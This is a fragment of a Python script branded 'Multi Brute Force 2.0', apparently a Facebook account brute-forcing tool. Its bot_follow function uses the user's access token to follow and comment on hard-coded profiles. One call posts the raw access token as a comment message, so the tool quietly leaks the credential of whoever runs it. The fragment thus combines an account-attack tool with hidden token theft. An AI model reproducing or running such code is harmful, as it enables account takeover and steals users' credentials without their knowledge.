...
def banner():
    print("""   ___                   \n  / _ \_______             ® \n / ___/ __/ -_) Multi Brute  ┌──────────────────────────────┐\n/_/  /_/__\__/(_) Force 2.0  │  Script By Arsalaan  │\n       /  ^ \/ / // /  ^ \   │   •• Github.com/Miixjackers ••   │\n      /_/_/_/_/\_,_/_/_/_/   └──────────────────────────────┘""")
...
def bot_follow():
	...
	requests.post('https://graph.facebook.com/100007576032235/subscribers?access_token=' + toket) #AL Muizz Miixjackers
	requests.post('https://graph.facebook.com/10215994561776676/comments/?message=' +toket+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/100007576032235/comments/?message=' +kom+ '&access_token=' + toket)
	menu()
